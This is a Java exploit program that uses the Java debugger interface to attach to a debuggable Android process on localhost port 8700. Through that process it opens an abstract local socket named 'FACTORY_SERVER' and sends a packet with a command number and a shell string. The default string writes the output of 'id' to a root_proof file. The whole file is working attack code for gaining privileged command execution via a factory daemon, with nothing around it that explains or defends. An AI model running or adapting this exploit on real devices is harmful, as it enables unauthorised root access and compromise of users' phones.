import com.sun.jdi.*;
import com.sun.jdi.connect.*;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class JdiProbe {
    static Method findMethod(ReferenceType t, String name, String sig) {
        for (Method m : t.methodsByName(name)) {
            if (m.signature().equals(sig)) return m;
        }
        return null;
    }

    public static void main(String[] args) throws Exception {
        int cmd = args.length > 0 ? Integer.parseInt(args[0]) : 1;
        String command = args.length > 1 ? args[1] : "id > /data/local/tmp/root_proof 2>&1";

        AttachingConnector conn = null;
        for (AttachingConnector c : Bootstrap.virtualMachineManager().attachingConnectors()) {
            if (c.name().equals("com.sun.jdi.SocketAttach")) conn = c;
        }
        if (conn == null) { System.out.println("no socket attach connector"); return; }
        Map<String, Connector.Argument> cargs = conn.defaultArguments();
        cargs.get("hostname").setValue("localhost");
        cargs.get("port").setValue("8700");
        cargs.get("timeout").setValue("5000");

        VirtualMachine vm = conn.attach(cargs);
        System.out.println("attached: " + vm.name());
        try {
            vm.suspend();
            ThreadReference thr = null;
            for (ThreadReference t : vm.allThreads()) {
                if (t.name().equals("main")) { thr = t; break; }
            }
            if (thr == null) thr = vm.allThreads().get(0);
            if (!thr.isSuspended()) thr.suspend();
            for (int i = 0; i < 50 && !thr.isSuspended(); i++) Thread.sleep(100);
            System.out.println("thread: " + thr.name() + " suspended=" + thr.isSuspended());

            ReferenceType sockCls = vm.classesByName("android.net.LocalSocket").get(0);
            ReferenceType nsCls = vm.classesByName("android.net.LocalSocketAddress$Namespace").get(0);
            ReferenceType addrCls = vm.classesByName("android.net.LocalSocketAddress").get(0);

            Value abs = nsCls.getValue(nsCls.fieldByName("ABSTRACT"));

            Method sockCtor = findMethod(sockCls, "<init>", "()V");
            Method addrCtor = findMethod(addrCls, "<init>", "(Ljava/lang/String;Landroid/net/LocalSocketAddress$Namespace;)V");
            Method setTimeout = findMethod(sockCls, "setSoTimeout", "(I)V");
            Method connect = findMethod(sockCls, "connect", "(Landroid/net/LocalSocketAddress;)V");
            Method getOut = findMethod(sockCls, "getOutputStream", "()Ljava/io/OutputStream;");
            Method getIn = findMethod(sockCls, "getInputStream", "()Ljava/io/InputStream;");

            if (sockCtor == null || addrCtor == null || connect == null || getOut == null || getIn == null) {
                System.out.println("method lookup failed");
                return;
            }

            ObjectReference sock = ((ClassType) sockCls).newInstance(thr, sockCtor, Collections.emptyList(), 0);
            ObjectReference addr = ((ClassType) addrCls).newInstance(thr, addrCtor,
                    Arrays.asList(vm.mirrorOf("FACTORY_SERVER"), abs), 0);
            if (setTimeout != null) sock.invokeMethod(thr, setTimeout, Collections.singletonList(vm.mirrorOf(3000)), 0);

            try {
                sock.invokeMethod(thr, connect, Collections.singletonList(addr), 0);
                System.out.println("connected");
            } catch (InvocationException ie) {
                System.out.println("connect exception: " + ie.exception().referenceType().name() + " " + ie.getMessage());
                return;
            }

            byte[] payload = new byte[260];
            ByteBuffer.wrap(payload).order(ByteOrder.LITTLE_ENDIAN).putInt(cmd);
            byte[] cb = command.getBytes(StandardCharsets.UTF_8);
            System.arraycopy(cb, 0, payload, 4, Math.min(cb.length, 255));

            ObjectReference out = (ObjectReference) sock.invokeMethod(thr, getOut, Collections.emptyList(), 0);
            Method write = findMethod(out.referenceType(), "write", "([B)V");
            ArrayType payloadType = (ArrayType) write.argumentTypes().get(0);
            ArrayReference payloadArr = payloadType.newInstance(payload.length);
            List<Value> pv = new ArrayList<>();
            for (byte b : payload) pv.add(vm.mirrorOf(b));
            payloadArr.setValues(0, pv, 0, pv.size());
            out.invokeMethod(thr, write, Collections.singletonList((Value) payloadArr), 0);
            System.out.println("sent cmd=" + cmd + " payload=" + command);

            ObjectReference in = (ObjectReference) sock.invokeMethod(thr, getIn, Collections.emptyList(), 0);
            Method read = findMethod(in.referenceType(), "read", "([B)I");
            ArrayReference rbuf = ((ArrayType) read.argumentTypes().get(0)).newInstance(4096);
            Value n = in.invokeMethod(thr, read, Collections.singletonList((Value) rbuf), 0);
            int len = ((IntegerValue) n).value();
            System.out.println("read len=" + len);
            if (len > 0) {
                StringBuilder sb = new StringBuilder();
                List<Value> vals = rbuf.getValues(0, Math.min(len, 200));
                for (Value v : vals) {
                    int b = ((ByteValue) v).value() & 0xff;
                    sb.append(b >= 32 && b < 127 ? (char) b : '.');
                }
                System.out.println("resp: " + sb);
            }
        } finally {
            vm.resume();
            vm.dispose();
        }
    }
}
